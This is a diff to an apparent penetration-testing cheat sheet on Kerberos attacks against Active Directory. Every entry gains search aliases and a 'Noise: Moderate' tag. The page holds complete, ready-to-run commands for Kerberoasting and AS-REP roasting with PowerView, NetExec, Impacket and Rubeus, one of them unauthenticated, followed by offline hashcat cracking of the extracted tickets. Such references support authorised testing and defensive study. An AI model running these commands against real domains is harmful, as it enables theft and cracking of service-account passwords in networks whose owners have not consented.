@@ -1,5 +1,7 @@
 # Kerberos
 
+<span class="ol-search-aliases">kerberoast asrep roast as-rep tgs spn kerberos rubeus GetUserSPNs GetNPUsers</span>
+
 SPNs, roasting candidates, tickets and common Kerberos discovery.
 
 <div class="ol-section-kicker"><span>AD</span></div>
@@ -10,7 +12,7 @@ SPNs, roasting candidates, tickets and common Kerberos discovery.
 Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
 ```
 
-**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user
+**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user · **Noise:** Moderate
 
 
 ## NetExec Kerberoasting
@@ -19,7 +21,7 @@ Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
 nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast.txt
 ```
 
-**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user
+**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user · **Noise:** Moderate
 
 
 ## Impacket Kerberoast
@@ -28,7 +30,7 @@ nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast.txt
 GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt
 ```
 
-**Tool:** Impacket · **Platform:** Linux/macOS · **Context:** Domain user
+**Tool:** Impacket · **Platform:** Linux/macOS · **Context:** Domain user · **Noise:** Moderate
 
 
 ## PowerView AS-REP candidates
@@ -37,7 +39,7 @@ GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile 
 Get-DomainUser -PreauthNotRequired | Select samaccountname
 ```
 
-**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user
+**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user · **Noise:** Moderate
 
 
 ## NetExec AS-REP roasting
@@ -46,7 +48,7 @@ Get-DomainUser -PreauthNotRequired | Select samaccountname
 nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --asreproast asrep.txt
 ```
 
-**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user
+**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user · **Noise:** Moderate
 
 
 ## Impacket AS-REP roasting
@@ -55,7 +57,7 @@ nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --asreproast asrep.txt
 GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat -outputfile asrep.txt
 ```
 
-**Tool:** Impacket · **Platform:** Linux/macOS · **Context:** No auth
+**Tool:** Impacket · **Platform:** Linux/macOS · **Context:** No auth · **Noise:** Moderate
 
 
 ## List Windows Kerberos tickets
@@ -64,7 +66,7 @@ GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -format h
 klist
 ```
 
-**Tool:** klist · **Platform:** Windows · **Context:** Domain user
+**Tool:** klist · **Platform:** Windows · **Context:** Domain user · **Noise:** Moderate
 
 
 ## Rubeus ticket triage
@@ -73,7 +75,7 @@ klist
 Rubeus.exe triage
 ```
 
-**Tool:** Rubeus · **Platform:** Windows · **Context:** Domain user
+**Tool:** Rubeus · **Platform:** Windows · **Context:** Domain user · **Noise:** Moderate
 
 
 ## Hashcat Kerberoast etype 23
@@ -82,7 +84,7 @@ Rubeus.exe triage
 hashcat -m 13100 kerberoast.txt <WORDLIST>
 ```
 
-**Tool:** hashcat · **Platform:** Cross-platform · **Context:** Domain user
+**Tool:** hashcat · **Platform:** Cross-platform · **Context:** Domain user · **Noise:** Moderate
 
 
 ## Hashcat AS-REP etype 23
@@ -91,7 +93,7 @@ hashcat -m 13100 kerberoast.txt <WORDLIST>
 hashcat -m 18200 asrep.txt <WORDLIST>
 ```
 
-**Tool:** hashcat · **Platform:** Cross-platform · **Context:** Domain user
+**Tool:** hashcat · **Platform:** Cross-platform · **Context:** Domain user · **Noise:** Moderate
 
 ---
 
